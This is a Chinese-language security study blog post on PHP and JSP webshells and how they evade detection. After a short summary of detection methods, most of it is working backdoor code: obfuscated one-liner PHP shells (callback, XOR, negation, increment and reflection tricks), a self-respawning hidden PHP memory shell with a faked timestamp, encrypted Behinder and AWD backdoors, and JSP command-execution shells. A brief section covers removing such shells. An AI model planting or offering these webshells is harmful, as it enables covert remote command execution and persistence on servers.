title: webshell学习
author: bmth
tags:
  - 学习笔记
categories: []
img: 'https://img-blog.csdnimg.cn/20210304212600229.png'
date: 2020-11-01 22:39:00
---
前面的是转载来自Smi1e师傅，[PHP Webshell检测与绕过](https://www.anquanke.com/post/id/197631)
## 前言

一般的，利用能够执行系统命令、加载代码的函数，或者组合一些普通函数，完成一些高级间谍功能的网站后门的脚本，叫做 `Webshell` 。而php做为一门动态语言，其灵活性很高，因此一直以来 `Webshell` 的绕过与检测之间不断的产生着化学反应。

`Webshell` 绕过的本质其实是针对不同的检测给予不同的绕过方式，因此想要学会绕过，首先要了解 `Webshell` 是如何检测的。

### Webshell 检测

[webshell检测模型](https://www.cnblogs.com/he1m4n6a/p/9245155.html)

> Webshell的运行流程： `hacker -> HTTP Protocol -> Web Server -> CGI` 。简单来看就是这样一个顺序：黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件。棘手的是，webshell就是一个合法的TCP连接，在TCP/IP的应用层之下没有任何特征（当然不是绝对的），只有在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。

`Webshell` 检测大致分为

- 静态检测，通过匹配特征码，特征值，危险函数函数来查找 WebShell 的方法，只能查找已知的 WebShell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。
- 动态检测，执行时刻表现出来的特征，比如数据库操作、敏感文件读取等。
- 语法检测，根据 PHP 语言扫描编译的实现方式，进行剥离代码、注释，分析变量、函数、字符串、语言结构的分析方式，来实现关键危险函数的捕捉方式。这样可以完美解决漏报的情况。但误报上，仍存在问题。
- 统计学检测，通过信息熵、最长单词、重合指数、压缩比等检测。

这里着重讲的是静态特征检测，静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，容易被绕过。

#### 基于webshell特征检测

常见webshell函数

- 存在系统调用的命令执行函数，如 `eval、system、cmd_shell、assert` 等；
- 存在系统调用的文件操作函数，如 `fopen、fwrite、readdir` 等；
- 存在数据库操作函数，调用系统自身的存储过程来连接数据库操作；
- 具备很深的自身隐藏性、可伪装性，可长期潜伏到web源码中；
- 衍生变种多，可通过自定义加解密函数、利用xor、字符串反转、压缩、截断重组等方法来绕过检测；

```php
//利用base64编码
<?php
$b = base64_encode(‘whoami‘);
echo $b.'';
echo base64_decode($b).'';?>
//利用gzcompress压缩
<?php
$c = gzcompress('whoami');
echo $c.'<br>';
echo gzuncompress($c)."";?>
//进制运算    
 <?php @$_++; $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/"); ?>
//利用注释符
<?php @${$__}[!$_](${$__}[$_]);@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);    ?>
```

`Webshell` 的实现需要两步：数据的传递、执行所传递的数据。

![](https://p1.ssl.qhimg.com/t0115623bb3e84ef7b7.png)

对于执行数据部分，我们可以收集关键词，匹配脚本文件中的关键词找出可疑函数，当执行数据部分匹配到可疑函数时再进行判断其数据传递部分是否为用户可控，譬如 `$_POST、$_GET、$_REQUEST、$_FILES、$_COOKIE、$_SERVER` 等等。

![](https://p4.ssl.qhimg.com/t01fecad85427b32f39.png)

不过一些变形的 `webshell` 通过各种编码、加密、压缩PHP文件，或者通过一些动态方法调用来绕过关键字匹配，此时我们可以通过收集 `webshell` 中会用到的而一般文件不会用到的函数和代码、收集出现过的 `webshell` ，将其中的特征码提取出来，也就是收集特征码，特征值，危险函数来完善规则库，提高查杀率。

### Webshell 绕过

#### PHP动态特性的捕捉与逃逸

在p牛的[《PHP动态特性的捕捉与逃逸》](https://github.com/knownsec/KCon/blob/master/2019/25日/PHP动态特性的捕捉与逃逸.pdf) 中，将常见的PHP一句话木马分为如下几个类别：

![](https://p3.ssl.qhimg.com/dm/1024_269_/t017fad5ab6c46df2ad.png)

![](https://p5.ssl.qhimg.com/dm/1024_164_/t01170b4aed7b60b651.png)

其中回调型后门的检测：

1. 遍历AST Tree
2. 分析FuncCall Node，判断是否调用了含有”回调参数”的函数
3. 判断回调参数是否是一个变量

介绍了如何绕过回调参数黑名单

**大小写绕过**

```php
<?php
UsORt($_POST[1], $_POST[2]);
```

**函数别名**

`mbereg_replace` 、 `mbereg_ireplace` 在文档里搜索不到，实际上却是 `mb_ereg_replace` 、 `mb_eregi_replace` 的别名，而 `mb_ereg_replace` 、 `mb_eregi_replace` 的作用和 `preg_replace` 一样，支持传入e模式的正则表达式，进而执行任意代码；而且，PHP7后已经删除了 `preg_replace` 的e模式，而 `mb_ereg_replace` 的e模式仍然坚挺到现在。

```php
<?php
mbereg_replace('.*', '', $_REQUEST[2333], 'mer');
```

不过， `mbereg_replace` 这个别名在PHP7.3被移除了，所以上述代码只能在7.2及以下的PHP中使用。

**函数重命名**

```php
<?php
use function \assert as test;
test($_POST[2333]);
```

**类的继承**

```php
<?php
class test extends ReflectionFunction {}
$f = new test($_POST['name']);
$f->invoke($_POST[2333]);
```

php7匿名类

```php
<?php
$f = new class($_POST['name']) extends ReflectionFunction {};
$f->invoke($_POST[2333]);
```

**变长参数**

```php
<?php
usort(...$_GET);
```

**控制字符**

`[x00-x20]` PHP引擎会忽略这些控制字符，正确执行PHP函数；而PHP-Parser是无法正确解析的这些包含控制字符的函数的，可绕过一些具有语法解析的Webshell检测引擎：

```php
<?php eval\x01\x02($_POST[2333]);
```
其中\x01\x02需要转换成实际的字符。
**利用PHP标签识别差异**

![](https://p3.ssl.qhimg.com/t01730f06adbc81b17f.png)

而PHP-Parser只支持前两个标签，传入一个由 `<script>` 标签构造的 `Webshell` ，不识别该标签的检测引擎就会出现绕过：

```php
<script language="php">
  eval($_POST[2333]);
</script>
```

上面的方法同样可以配合各种绕过方式提高绕过的可能性。

####  一些有用的函数和调用

\- ``get_defined_vars()``

  获取文件中全部变量，包括include

\- ``eval(end(getallheaders()))``

  利用``HTTP``最后的一个``header``传参

\- ``eval(getallheaders(){'a'})``

  利用``HTTP``名为``a``的``header``传参

\- ``error_reporting(E_ALL);``

  开启报错

\- ``getcwd()``

  获得当前路径

#### 常规思路

**遍历PHP的文档，查找不常见且可做后门的回调函数**

利用下面五个关键词，能提高查找到拥有后门潜质的PHP回调函数的效率：

**关键词一：callable**

![](https://p3.ssl.qhimg.com/t0178d58bb721721ab4.png)

**关键词二：mixed $options**

![](https://p5.ssl.qhimg.com/t012a45b971ecc917ba.png)

**关键词三：handler**

![](https://p2.ssl.qhimg.com/t01bd12f06794606631.png)

**关键词四：callback**

![](https://p0.ssl.qhimg.com/t01f301e99b1c01f815.png)

**关键词五：invoke**

![](https://p2.ssl.qhimg.com/t015dc927ac757c7f88.png)

**substr拼接**

![](https://p4.ssl.qhimg.com/dm/1024_614_/t0171d292fb95be2b64.png)

**变量覆盖**

```php
<?php
$b='ls';
parse_str("a=$b");
print_r(`$a`); 
?>
```

**析构函数**

```php
<?php
	class User {
		public $name="";
		function __destruct (){
			eval($this->name);
		}	
	}
	highlight_file(__FILE__);

	$user = new User;
	$user->name = $_GET['l1nk'];
?>
```

#### 利用文件名

一般webshell是通过文件内容来查杀，因此我们可以利用一切非文件内容的可控值来构造webshell，譬如文件名

```php
<?php
substr(__FILE__, -10,-4)($_GET['a']);
?>
```

同理，除了文件名，还有哪些我们很容易可以控制的值呢？

函数名也可。

```php
<?php 
function systema(){
    substr(__FUNCTION__, -7,-1)($_GET['a']);
}
systema();
```

同理方法名也可

```php
<?php 
class test{
    function systema(){
        substr(__METHOD__, -7,-1)($_GET['a']);
    }
}
$a = new test();
$a->systema();
```

还有类名 `__CLASS__` 什么的就不再多说了。

#### 利用注释

`PHP Reflection API` 可以用于导出或者提取关于类 , 方法 , 属性 , 参数 等详细信息 . 甚至包含注释的内容。

```php
<?php
/**
*system
*/
highlight_file(__FILE__);
class TestClass {}

$rc = new ReflectionClass('TestClass');
#echo $rc->getDocComment();
echo substr($rc->getDocComment(),-9,-3)($_GET['l1nk']);
?>
```

#### 利用getenv+Apache + HTTP header

`getenv` 能够获取 `phpinfo` 中 `ApacheEnvironment` 和 `Environment` 中的值。

请求头中的变量会以 `HTTP_变量名` 的形式存在 `Apache Environment` 中。

因此我们在请求头中带上 `E: system` ，我们可以通过 `getenv('HTTP_E')` 来获取其值 `system`

![](https://p5.ssl.qhimg.com/dm/1024_311_/t0124ed7b865e286bb5.png)

![](https://p5.ssl.qhimg.com/t010d431032145659ef.png)

#### 利用字符取反

```php
<?php
$str = 'phpinfo';
$str = str_split($str);
$flag='';
foreach ($str as  $value) {
    $flag.=~$value;
}
echo "(~".urlencode($flag).")();";
```



```php
(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));
//("assert")(("next")(("getallheaders")()));
```

#### 利用字符异或

```python
payload="phpinfo"
allowed="BCHIJKLMNQRTUVWXYZ\\^bchijklmnqrtuvwxyz}~!#%*/:;<=>?@"# no ()
reth=""
rett=""
for c in payload:
    flag=False
    for i in allowed:
        if flag == False:
            for j in allowed:
                if ord(i)^ord(j)==ord(c):
                    #print("i=%s j=%s c=%s"%(i,j,c))
                    reth=reth+"%"+str(hex(ord(i)))[2:]
                    rett=rett+"%"+str(hex(ord(j)))[2:]
                    flag=True
                    break
ret=reth+"^"+rett

print ret
```

#### 利用字符自增

```php
<?=[$_=[],
$_=@"$_",
$_=$_['!'=='@'],
$____='_',
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$_=$____,
$_["__"]($_["_"])]?>//$_POST["__"]($_POST["_"])
```



### Referer

[PHP动态特性的捕捉与逃逸](https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html)

[php-webshell-detect-bypass](https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md)

[创造tips的秘籍——PHP回调后门](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)

[过D盾webshell分享](https://xz.aliyun.com/t/3959)

[Webshell入侵检测初探（一）](https://www.freebuf.com/articles/web/183520.html)

[webshell检测方法归纳](https://www.cnblogs.com/he1m4n6a/p/9245155.html)

[Smi1e  php webshell检测与绕过](https://www.smi1e.top/php-webshell检测与绕过/)

## php_webshell

```php
1:
<?php
$a = array('system' => 'a');
$b = array_search('a',$a);
$b($_GET[1]);//?1=ls
?>

2:
<?php
$tokens = token_get_all('<?php system; ?>');
$s = $tokens[1][1];
$s($_GET[1]);//?1=whoami
?>

3:
<?php
//?0=a%3Dsystem%26b%3Dwhoami
parse_str($_GET[0]);
$a($b);
?>

4:
<?php
//触发连接: http://127.0.0.1/66.php?1=phpinfo();&2=2
//原理:利用引擎对ast语法数中Expr_BinaryOp_Pow未标记污点原理
$index = $_GET[2] ** 1;
var_dump($index);
$arr = array(2=>'$_');
$hit = $arr[$index];
$payloads = 'ev'.'al'.'('.$hit.'G'.'ET'.'[1]);';
eval($payloads);
?>

5:
<?php
//a=system|whoami
function myErrorHandler($errno, $errstr, $errfile, $errline)
{
	$a = explode('|', $errstr);
	$a[0]($a[1]);
}
set_error_handLer("myErrorHandler");

trigger_error($_GET["a"], E_USER_ERROR);
?>

6:
<?php
define('Y', count($_GET)+114);
define ("YEAR", 'ob_get_content'.chr(Y));
echo $_GET["c"];//?c=phpinfo();
$c = YEAR;
$string = $c();
eval($string);
?>

7:
//php版本小于7.1，assert可使用时才可
<?php
class test1
{
    public static function test2()
    {
        forward_static_call("assert", @$_REQUEST['x']);//?x=phpinfo()
    }
}
test1::test2();
?>

8:
<?php @eval(false ? 1 : $_POST[1]);//1=phpinfo();
```

[蚁剑自定义编码器](https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php)
[攻防礼盒：哥斯拉Godzilla Shell管理工具](https://www.freebuf.com/sectool/247104.html)
**内存马：**
```php
<?php
	set_time_limit(0);			//设置脚本最大执行时间,0 即为无时间限制
	ignore_user_abort(true);	//设置与客户机断开不终止脚本的执行
	unlink(__FILE__);			//删除文件自身
	$file = '/var/www/html/.shell.php';	
	$code = '<?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8"){@system($_POST[a]);}?>';
	while (1) {
		file_put_contents($file, $code);	//写shell文件
		system('touch -m -d "2014-10-31 13:50:11" .shell.php');		//修改时间戳
		usleep(1000);			//以指定的微秒数延缓程序的执行
	}
?>
```
[Filter/Servlet型内存马的扫描抓捕与查杀 ](https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/)
[查杀Java web filter型内存马 ](https://gv7.me/articles/2020/kill-java-web-filter-memshell/)
杀死PHP不死马:
>1、高权限，重启服务
service apache2 restart
service php restart
2、最好的解决方案是kill掉www-data用户的所有子进程：
`ps aux | grep www-data | awk '{print $2}' | xargs kill -9`
3、创建一个和不死马生成的马一样名字的目录
4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果

```php
<?php
while (1) {
	$pid = 不死马的进程PID;
	@unlink(".ski12.php");
	exec("kill -9 $pid");
	usleep(1000);
}
?>
```

[PHP内存型木马](https://blog.csdn.net/ski_12/article/details/84920127)
可学习文章：
[从静态到动态打造一款免杀的antSword(蚁剑)](https://xz.aliyun.com/t/4000)
[常见php一句话webshell解析](http://blkstone.github.io/2016/07/21/php-webshell/)
[PHP后门之冷门回调函数(过waf)](https://www.cnblogs.com/-qing-/p/10821238.html)
[PHP Webshell那些事——攻击篇](https://www.anquanke.com/post/id/212728)
[探讨新技术背景下的一句话免杀](https://www.anquanke.com/post/id/197624)
[我们要WebShell过人！](https://www.freebuf.com/articles/web/241454.html)
[PHP webshell 免杀姿势总结](https://www.sqlsec.com/2020/07/shell.html)
[那些强悍的PHP一句话后门](https://www.uedbox.com/post/6051/)
[php一句话木马检测绕过研究](https://xz.aliyun.com/t/2335)
[无eval 木马免杀人免杀D盾](https://www.o2oxy.cn/2716.html)
[PHP后门隐藏技巧](https://mp.weixin.qq.com/s/UqmN_b4EXewCN7WPei14_A)
[Tomcat 源代码调试笔记 - 看不见的 Shell](https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw)
### 记录一些师傅分析的awd后门

#### 1

```php
<?php 
$string = '';
$password = 'password';
if(isset($_POST[$password])){
    $hex = $_POST[$password];
    for($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
}
eval($string);
?>
```

简单分析一下代码，存在eval代码执行，执行的$string变量是通过POST过来的数据进行hexdec解密，chr函数再次解密拼接形成的，两个函数的作用分别是将十六进制字符转换为十进制字符，将ASCII码转换为字符，所以我们如果构造eval代码执行输出1的话，需要先对我们的传输的变量进行ascii码转化，之后依次进行hex加密即可

```php
echo 1; #输出1
10199104111324959 #ascii码后数据
6563686f20313b #依次hex加密后的代码
```

#### 2 
是冰蝎加密shell
[冰蝎动态二进制加密WebShell特征分析](https://www.freebuf.com/articles/web/213905.html)
[“冰蝎”动态二进制加密网站管理客户端 – WebShell管理工具](https://www.uedbox.com/post/51031/)

```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码：rebeyond
    $_SESSION['k']=$key;
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");

        for($i=0;$i<strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&15]; 
                }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

不用工具的利用方式：
分析一下代码，如果我们访问方式为POST时，post变量的值为我们的POST的数据，之后再次进行判断，如果存在openssl拓展组件，执行else之后的内容即

```php
$post=openssl_decrypt($post, "AES128", $key);
```

这是属于一个解密的函数，我们可以使用代码中获取的key对我们的POST的变量进行加密，之后在传输到此处后进行解密，下一步看一下我们需要传输的数据，\$arr处利用“|”进行了数组拆分，并在之后利用call_user_function调用执行shell，所以我们需要传输的数据为，“|”+代码，构造一下

```php
$post="|phpinfo();";
$key="e45e329feb5d925b";
$post=openssl_encrypt($post, "AES128", $key);
print_r($post);
//vACvqxX9t64+Nc3M2S4VuQ==
```
#### 3

```php
<?php 
error_reporting(0);
set_time_limit(0);
$a=base64_decode("Y"."X"."N"."z"."Z"."X"."J"."0");
$a(@${"_P"."O"."S"."T"}[520]); ?>
```

关键代码在最后两行，最后一行比较好理解，拼接`$_POST[520]`第三行的话主要在于，先去拼接一段加密的字符串，之后再进行base64的解密，取一下字符串

```
YXNzZXJ0 #base64
assert #base64解密后
```

即为：

```php
<?php assert($_POST[520]);?>
```

#### 4

```php
class ciscn_nt {
    var $a;
    var $b;
    function __construct($a,$b) {
        $this->a=$a;
        $this->b=$b;
    }
    function test() {
       array_map($this->a,$this->b);
    }
}
$p1=new ciscn_nt(assert,array($_POST['x']));
$p1->test();
```

用了array_map()这一个回调函数在`$p1`处定义了`$a`和`$b`的值分别为assert和$_POST[‘x’]
最后再调用test()函数触发array_map()，从而达到执行我们POST传输的代码的目的，简单来说就是是实现:

```php
<?php assert($_POST['x']);?>
```

[一次内部AWD记录](http://www.pdsdt.lovepdsdt.com/index.php/2020/10/11/awd-neibu/)
[CISCN_Final——AWD&CTF部分Writeup](http://www.pdsdt.lovepdsdt.com/index.php/2020/10/02/ciscn_final-awd-ctf/)
## jsp_webshell
写文件
```java
<% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
```
保存为1.jsp，提交url为`http://localhost/1.jsp?f=1.txt&t=hello`
访问`http://localhost/1.txt` 出来hello

无密码直接命令执行：
```java
<%@ page import="java.util.*,java.io.*,java.net.*"%>  <HTML><BODY>
<form action="" name="myform" method="POST" style="box-sizing: border-box; margin-top: 0px;"><input name="cmd" type="text" style="box-sizing: border-box !important; color: var(--text-color); font: inherit; margin: 0px;  padding-left: 4px; border: 1px solid rgba(146, 146, 146, 0.56);"> <input value="Send" type="submit" style="box-sizing: border-box !important; color: var(--text-color); font: inherit; margin: 0px;  padding-left: 4px; border: 1px solid rgba(146, 146, 146, 0.56); -webkit-appearance: button; cursor: pointer;"></form>

<pre class="" style="box-sizing: border-box; overflow: auto; font-family: var(--monospace); margin-bottom: 0px; width: inherit; white-space: pre-wrap;"><%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "\n");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); disr = dis.readLine(); }
        }
%>
</pre>
</BODY></HTML> 
```
GET传参：?pwd=bmth&cmd=ls
```java
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("bmth".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>
```

**反射Runtime命令执行**
如果我们不希望在代码中出现和`Runtime`相关的关键字，我们可以全部用反射代替
```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Scanner" %>

<%
    String str = request.getParameter("str");

    // 定义"java.lang.Runtime"字符串变量
    String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101});

    // 反射java.lang.Runtime类获取Class对象
    Class<?> c = Class.forName(rt);

    // 反射获取Runtime类的getRuntime方法
    Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101}));

    // 反射获取Runtime类的exec方法
    Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);

    // 反射调用Runtime.getRuntime().exec(xxx)方法
    Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str});

    // 反射获取Process类的getInputStream方法
    Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
    m.setAccessible(true);

    // 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串
    Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter("\\A");
    String result = s.hasNext() ? s.next() : "";

    // 输出命令执行结果
    out.println(result);
%>
```
命令参数是str，如：`reflection-cmd.jsp?str=pwd`

Tomcat无文件Shell： https://github.com/z1Ro0/tomcat_nofile_webshell

冰蝎去特征（请参考酒仙桥六号部队的文章）:
[冰蝎，从入门到魔改（续）](https://mp.weixin.qq.com/s/s_DcLdhEtIZkC2_z0Zz4FQ)
[冰蝎改造之不改动客户端=>内存马](https://xiaomibk.com/9528/)
[中间件内存马注入&冰蝎连接(附更改部分代码)](https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g)